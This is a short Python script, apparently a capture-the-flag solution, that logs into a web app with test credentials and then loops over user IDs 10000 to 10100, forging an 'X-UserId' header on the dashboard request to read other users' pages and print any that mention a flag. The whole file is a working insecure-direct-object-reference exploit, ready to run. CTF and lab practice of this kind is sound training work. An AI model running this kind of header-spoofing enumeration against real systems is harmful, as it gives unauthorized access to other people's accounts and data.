import requests
import re

class IDORExploit:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.username = username
        self.password = password

    def login(self):
        print("[*] Logging in...")
        self.session.post(f"{self.base_url}/", data={"username": self.username})
        response = self.session.post(
            f"{self.base_url}/password/{self.username}",
            data={"password": self.password},
        )
        if response.status_code == 200 or "dashboard" in response.url:
            print("[+] Login successful!")
            return True
        else:
            print("[-] Login failed!")
            return False

    def exploit_idor(self):
        print(f"[*] Enumerating user IDs from 10000 to 10100...")
        for user_id in range(10000, 10101):
            headers = {"X-UserId": str(user_id)}
            try:
                response = self.session.get(
                    f"{self.base_url}/dashboard", headers=headers, allow_redirects=False
                )
                if response.status_code == 200 and "Authentication Failed" not in response.text:
                    flag_keywords = re.findall(r".{0,20}(flag|Flag|FLAG).{0,20}", response.text, re.I)
                    if flag_keywords:
                        print(f"[!] User ID {user_id} - Potential flag found:")
                        print(response.text)
            except Exception as e:
                print(f"[-] Error testing User ID {user_id}: {e}")

    def run(self):
        if not self.login():
            return
        self.exploit_idor()

if __name__ == "__main__":
    TARGET_URL = "http://ip32770"
    USERNAME = "test"
    PASSWORD = "test"
    exploit = IDORExploit(TARGET_URL, USERNAME, PASSWORD)
    exploit.run()